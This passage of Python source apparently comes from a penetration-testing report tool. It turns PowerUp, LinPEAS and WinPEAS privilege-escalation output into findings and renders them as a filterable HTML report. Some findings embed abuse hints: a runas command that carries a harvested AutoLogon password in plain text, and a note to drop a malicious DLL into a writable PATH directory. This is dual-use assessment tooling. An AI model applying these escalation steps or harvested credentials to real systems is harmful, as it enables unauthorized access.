                findings.append(Finding(
                    tool="PowerUp", severity=sev,
                    category="Service Misconfiguration",
                    title=f"Modifiable service binary: {svc}",
                    detail=f"Path: {path}  |  Perms: {perms}  |  Identity: {identity}",
                    abuse=f"{abuse_fn}{note}",
                    can_restart=can_restart,
                ))

            elif "PATH" in check or "Hijack" in check:
                # Skip user-owned AppData paths — process loads as the user, no privesc
                if self._is_user_appdata(path):
                    continue
                findings.append(Finding(
                    tool="PowerUp", severity="high",
                    category="DLL Hijacking",
                    title=f"PATH DLL hijack: {path}",
                    detail=f"Identity: {identity}  |  Perms: {perms}",
                    abuse=f"{abuse_fn}\n# Drop malicious DLL in writable PATH directory",
                ))

            elif "Autologon" in check:
                user = props.get("DefaultUserName", "?")
                pw = props.get("DefaultPassword", "(empty)")
                findings.append(Finding(
                    tool="PowerUp", severity="high",
                    category="AutoLogon Credentials",
                    title=f"Registry AutoLogon: user={user}",
                    detail=f"Username: {user}  |  Password: {pw}",
                    abuse=f"runas /user:{user} cmd  # password: {pw}",
                ))

            elif "Unquoted" in check:
                findings.append(Finding(
                    tool="PowerUp", severity="high",
                    category="Service Misconfiguration",
                    title=f"Unquoted service path: {svc}",
                    detail=f"Path: {path}",
                    abuse=f"{abuse_fn}",
                    can_restart=can_restart,
                ))

            elif check:
                findings.append(Finding(
                    tool="PowerUp", severity="high",
                    category="Service Misconfiguration",
                    title=f"{check}: {svc or path}",
                    detail=f"Perms: {perms}  |  Identity: {identity}",
                    abuse=f"{abuse_fn}",
                    can_restart=can_restart,
                ))

        return findings

    # ── HTML report ──────────────────────────────────────────────────────────

    def generate_html(self, findings: list[Finding], source_files: list[str], output_path: str):
        html = _build_html(findings, source_files)
        Path(output_path).write_text(html, encoding="utf-8")


# ── HTML builder ──────────────────────────────────────────────────────────────

_SEV_STYLE = {
    "critical": ("#f85149", "🔴"),
    "high":     ("#f0883e", "🟠"),
    "medium":   ("#d29922", "🟡"),
    "info":     ("#8b949e", "⚪"),
}
_TOOL_COLOR = {"LinPEAS": "#7aab7a", "WinPEAS": "#4d9de0", "PowerUp": "#c9a96e"}


def _esc(s: str) -> str:
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")


def _build_html(findings: list[Finding], source_files: list[str]) -> str:
    stats = {s: sum(1 for f in findings if f.severity == s) for s in _SEV_STYLE}
    total = len(findings)
    tools = sorted(set(f.tool for f in findings))

    os_type = (
        "linux"   if any(t == "LinPEAS" for t in tools) and not any(t in ("WinPEAS","PowerUp") for t in tools)
        else "windows" if not any(t == "LinPEAS" for t in tools)
        else "mixed"
    )
    os_icon = {"linux": "🐧", "windows": "🪟", "mixed": "💻"}[os_type]

    src_names = " · ".join(Path(f).name for f in source_files if Path(f).exists())
    now = datetime.now().strftime("%Y-%m-%d %H:%M")

    # ── Donut SVG ────────────────────────────────────────────────────────────
    def _donut():
        if not total:
            return '<div style="color:#8b949e;font-size:12px">No findings</div>'
        C = 251.2
        offset = 0.0
        circles = ""
        for sev in ("critical", "high", "medium", "info"):
            n = stats[sev]
            if not n:
                continue
            col = _SEV_STYLE[sev][0]
            length = (n / total) * C
            circles += (
                f'<circle cx="50" cy="50" r="40" fill="none" stroke="{col}" stroke-width="12" '
                f'stroke-dasharray="{length:.1f} {C:.1f}" '
                f'stroke-dashoffset="-{offset:.1f}" transform="rotate(-90 50 50)"/>'
            )
            offset += length
        return (
            f'<svg viewBox="0 0 100 100" width="130" height="130">'
            f'<circle cx="50" cy="50" r="40" fill="none" stroke="#21262d" stroke-width="12"/>'
            f'{circles}'
            f'<text x="50" y="46" text-anchor="middle" font-size="15" font-weight="700" fill="#c0c8d4">{total}</text>'
            f'<text x="50" y="59" text-anchor="middle" font-size="9" fill="#8b949e">findings</text>'
            f'</svg>'
        )

    # ── Stat chips ───────────────────────────────────────────────────────────
    def _chip(label: str, count: int, sev: str) -> str:
        if not count:
            return ""
        col, emoji = _SEV_STYLE[sev]
        return (
            f'<div style="background:#161b22;border:1px solid {col}44;border-left:3px solid {col};'
            f'border-radius:8px;padding:12px 18px;min-width:88px;text-align:center">'
            f'<div style="font-size:24px;font-weight:700;color:{col}">{count}</div>'
            f'<div style="font-size:11px;color:#8b949e;margin-top:2px">{emoji} {label}</div>'
            f'</div>'
        )

    chips = "".join(_chip(s.upper(), stats[s], s) for s in ("critical", "high", "medium", "info"))

    # ── Legend ───────────────────────────────────────────────────────────────
    legend_items = []
    for sev, (col, emoji) in _SEV_STYLE.items():
        n = stats[sev]
        if n:
            legend_items.append(
                f'<span style="display:inline-flex;align-items:center;gap:5px;font-size:12px">'
                f'<span style="width:10px;height:10px;border-radius:2px;background:{col};flex-shrink:0"></span>'
                f'<span style="color:#c0c8d4">{sev.capitalize()}</span>'
                f'<span style="color:#656d76">({n})</span>'
                f'</span>'
            )
    legend_html = '<div style="display:flex;flex-wrap:wrap;gap:12px">' + "".join(legend_items) + '</div>'

    # ── Category buttons ─────────────────────────────────────────────────────
    cats: dict[str, list[Finding]] = {}
    for f in findings:
        cats.setdefault(f.category, []).append(f)

    def _cat_btn(cat: str, cat_findings: list[Finding]) -> str:
        worst = min(cat_findings, key=lambda x: _SEV_ORDER.get(x.severity, 9)).severity
        col = _SEV_STYLE.get(worst, ("#8b949e", ""))[0]
        n = len(cat_findings)
        return (
            f'<button class="cat-btn" data-cat="{_esc(cat)}" onclick="filterCat(\'{_esc(cat)}\')" '
            f'style="display:inline-flex;align-items:center;gap:5px;padding:5px 11px;border-radius:6px;'
            f'cursor:pointer;font-size:11px;color:#c0c8d4;border:1px solid #30363d;background:#161b22;'
            f'white-space:nowrap">'
            f'<span style="width:7px;height:7px;border-radius:50%;background:{col};flex-shrink:0"></span>'
            f'{_esc(cat)}'
            f'<span style="background:#21262d;color:#8b949e;font-size:10px;padding:0 5px;border-radius:8px">{n}</span>'
            f'</button>'
        )

    cat_buttons = "".join(_cat_btn(c, cf) for c, cf in sorted(cats.items(), key=lambda x: _SEV_ORDER.get(min(x[1], key=lambda f: _SEV_ORDER.get(f.severity, 9)).severity, 9)))

    # ── Attack paths (top 4 critical/high) ───────────────────────────────────
    top = [f for f in findings if f.severity in ("critical", "high")][:4]

    def _attack_card(f: Finding) -> str:
        col = _SEV_STYLE.get(f.severity, ("#8b949e",""))[0]
        abuse_first = f.abuse.split("\n")[0][:80] if f.abuse else "—"
        return (
            f'<div style="background:#0d1117;border:1px solid {col}33;border-left:3px solid {col};'
            f'border-radius:6px;padding:9px 13px;margin-bottom:7px">'
            f'<div style="font-size:12px;font-weight:600;color:#e6edf3">{_esc(f.category)} → {_esc(f.title)}</div>'
            f'<div style="font-size:11px;color:#8b949e;font-family:monospace;margin-top:3px">{_esc(abuse_first)}</div>'
            f'</div>'
        )

    attack_paths = "".join(_attack_card(f) for f in top) if top else '<div style="color:#8b949e;font-size:12px">No high/critical findings.</div>'

    # ── Finding cards ─────────────────────────────────────────────────────────
    def _finding_card(f: Finding, idx: int) -> str:
        col, emoji = _SEV_STYLE.get(f.severity, ("#8b949e", "⚪"))
        tool_col = _TOOL_COLOR.get(f.tool, "#8b949e")
        abuse_id = f"a{idx}"

        restart_badge = ""
        if f.can_restart is True:
            restart_badge = '<span style="font-size:10px;padding:1px 7px;border-radius:10px;background:#f8514933;border:1px solid #f8514966;color:#f85149;font-weight:600">⚡ Restartable</span>'
        elif f.can_restart is False:
            restart_badge = '<span style="font-size:10px;padding:1px 7px;border-radius:10px;background:#30363d;color:#8b949e">No Restart</span>'

        abuse_html = ""
        if f.abuse:
            abuse_html = (
                f'<div style="margin-top:10px;background:#0d1117;border:1px solid #30363d;border-radius:6px;overflow:hidden">'
                f'<div style="display:flex;align-items:center;justify-content:space-between;'
                f'padding:6px 10px;background:#161b22;border-bottom:1px solid #30363d">'
                f'<span style="font-size:11px;color:#c9a96e;font-weight:600">💥 Exploit / Abuse</span>'
                f'<button onclick="copyCode(\'{abuse_id}\')" style="background:none;border:1px solid #30363d;'
                f'color:#8b949e;font-size:10px;padding:2px 8px;border-radius:4px;cursor:pointer;font-family:inherit">Copy</button>'
                f'</div>'
                f'<pre id="{abuse_id}" style="margin:0;padding:10px 12px;font-family:\'Cascadia Code\',\'Fira Code\',monospace;'
                f'font-size:11.5px;color:#c0c8d4;white-space:pre-wrap;word-break:break-all;line-height:1.5">{_esc(f.abuse)}</pre>'
                f'</div>'
            )

        return (
            f'<div class="fcard" data-sev="{f.severity}" data-tool="{f.tool}" data-cat="{_esc(f.category)}" '
            f'style="background:#161b22;border:1px solid #30363d;border-left:3px solid {col};'
            f'border-radius:8px;padding:14px 16px;margin-bottom:10px">'
            f'<div style="display:flex;flex-wrap:wrap;align-items:center;gap:6px;margin-bottom:8px">'
            f'<span style="font-size:10px;padding:2px 8px;border-radius:10px;background:{col}22;'
            f'border:1px solid {col}55;color:{col};font-weight:700">{emoji} {f.severity.upper()}</span>'
            f'<span style="font-size:10px;padding:2px 8px;border-radius:10px;background:{tool_col}22;'
            f'border:1px solid {tool_col}44;color:{tool_col}">{f.tool}</span>'
            f'<span style="font-size:10px;padding:2px 8px;border-radius:10px;background:#21262d;'
            f'border:1px solid #30363d;color:#c9a96e">{_esc(f.category)}</span>'
            f'{restart_badge}'
            f'</div>'
            f'<div style="font-size:14px;font-weight:600;color:#e6edf3;margin-bottom:5px">{_esc(f.title)}</div>'
            f'<div style="font-size:12px;color:#8b949e;font-family:monospace;word-break:break-all;line-height:1.4">{_esc(f.detail)}</div>'
            f'{abuse_html}'
            f'</div>'
        )

    all_cards = "".join(_finding_card(f, i) for i, f in enumerate(findings))
    if not all_cards:
        all_cards = '<div style="color:#8b949e;padding:32px;text-align:center;font-size:14px">No findings detected in the provided files.</div>'

    # ── Tool badges ───────────────────────────────────────────────────────────
    tool_badges = "".join(
        f'<span style="font-size:11px;padding:3px 10px;border-radius:6px;background:{_TOOL_COLOR.get(t,"#8b949e")}22;'
        f'border:1px solid {_TOOL_COLOR.get(t,"#8b949e")}44;color:{_TOOL_COLOR.get(t,"#8b949e")}">{t}</span>'
        for t in tools
    )

    sev_filter_btns = "".join(
        f'<button onclick="filterSev(\'{s}\')" id="sevbtn-{s}" '
        f'style="background:none;border:1px solid {_SEV_STYLE[s][0]}44;color:{_SEV_STYLE[s][0]};'
        f'font-size:11px;padding:4px 10px;border-radius:6px;cursor:pointer">'
        f'{_SEV_STYLE[s][1]} {s.capitalize()} ({stats[s]})</button>'
        for s in ("critical", "high", "medium", "info") if stats[s]
    )

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>proxenum privesc — {_esc(src_names)}</title>
<style>
:root{{--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--border:#30363d;
      --text:#c0c8d4;--muted:#8b949e;--gold:#c9a96e;--sage:#7aab7a}}
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,sans-serif;min-height:100vh}}
.container{{max-width:1160px;margin:0 auto;padding:24px 18px}}
.panel{{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:20px;margin-bottom:22px}}
input[type=text]{{background:var(--bg);border:1px solid var(--border);color:var(--text);
                  border-radius:6px;padding:7px 13px;font-size:12px;outline:none;
                  font-family:'Cascadia Code','Fira Code',monospace;width:100%;max-width:360px}}
input[type=text]:focus{{border-color:#656d76}}
button:hover{{border-color:#656d76 !important;color:var(--text) !important}}
.fcard{{transition:border-color .15s}}
.fcard:hover{{border-color:#656d76 !important}}
.cat-btn.active{{background:var(--bg3) !important;border-color:#656d76 !important}}
.hidden{{display:none !important}}
::-webkit-scrollbar{{width:6px;height:6px}}
::-webkit-scrollbar-track{{background:var(--bg)}}
::-webkit-scrollbar-thumb{{background:var(--border);border-radius:3px}}
</style>
</head>
<body>

<!-- Header -->
<div style="background:#161b22;border-bottom:1px solid #30363d;padding:16px 28px;
     display:flex;align-items:center;gap:16px;flex-wrap:wrap">
  <div style="flex:1">
    <div style="font-size:18px;font-weight:700;color:#c9a96e">{os_icon} Privilege Escalation Report</div>
    <div style="font-size:11px;color:#8b949e;margin-top:3px">{_esc(src_names)} · {now}</div>
  </div>
  <div style="display:flex;gap:10px;flex-wrap:wrap">{chips}</div>
</div>

<div class="container">

  <!-- Overview: donut + legend + attack paths -->
  <div class="panel">
    <div style="display:flex;gap:28px;align-items:flex-start;flex-wrap:wrap">
      <div style="flex-shrink:0;display:flex;flex-direction:column;align-items:center;gap:10px">
        {_donut()}
        {legend_html}
      </div>
      <div style="flex:1;min-width:260px">
        <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:16px">{tool_badges}</div>
        <div style="font-size:13px;font-weight:600;color:#e6edf3;margin-bottom:10px">🎯 Top Attack Paths</div>
        {attack_paths}
      </div>
    </div>
  </div>

  <!-- Filter controls -->
  <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:10px">
    <input type="text" id="qsearch" placeholder="🔍  Search all findings..." oninput="filterAll()">
    <div style="display:flex;gap:6px;flex-wrap:wrap">
      {sev_filter_btns}
      <button onclick="filterSev('all')" id="sevbtn-all" style="background:none;border:1px solid #30363d;
        color:#8b949e;font-size:11px;padding:4px 10px;border-radius:6px;cursor:pointer">All ({total})</button>
    </div>
  </div>

  <!-- Category pills -->
  <div style="display:flex;flex-wrap:wrap;gap:7px;margin-bottom:18px">
    <button class="cat-btn active" data-cat="all" onclick="filterCat('all')"
      style="display:inline-flex;align-items:center;gap:5px;padding:5px 11px;border-radius:6px;
      cursor:pointer;font-size:11px;color:#c0c8d4;border:1px solid #656d76;background:var(--bg3);white-space:nowrap">
      All categories
    </button>
    {cat_buttons}
  </div>

  <!-- Finding cards -->
  <div id="findings">{all_cards}</div>
  <div id="no-results" class="hidden" style="color:#8b949e;padding:32px;text-align:center;font-size:14px">
    No matching findings.
  </div>

</div>

<script>
var _sev='all', _cat='all', _q='';

function filterAll(){{
  _q=document.getElementById('qsearch').value.trim().toLowerCase();
  var shown=0;
  document.querySelectorAll('.fcard').forEach(function(c){{
    var ok=(_sev==='all'||c.dataset.sev===_sev)
         &&(_cat==='all'||c.dataset.cat===_cat)
         &&(!_q||c.textContent.toLowerCase().includes(_q));
    c.classList.toggle('hidden',!ok);
    if(ok) shown++;
  }});
  document.getElementById('no-results').classList.toggle('hidden',shown>0);
}}

function filterSev(s){{
  _sev=s;
  document.querySelectorAll('[id^=sevbtn-]').forEach(function(b){{
    b.style.background=(b.id==='sevbtn-'+s)?'#21262d':'none';
  }});
  filterAll();
}}

function filterCat(c){{
  _cat=c;
  document.querySelectorAll('.cat-btn').forEach(function(b){{
    b.classList.toggle('active',b.dataset.cat===c);
  }});
  filterAll();
}}

function copyCode(id){{
  var el=document.getElementById(id);
  if(!el) return;
  navigator.clipboard.writeText(el.textContent).then(function(){{
    var btn=el.parentElement.querySelector('button');
    if(btn){{var old=btn.textContent;btn.textContent='✓ Copied!';setTimeout(function(){{btn.textContent=old;}},1500);}}
  }});
}}
</script>
</body>
</html>"""
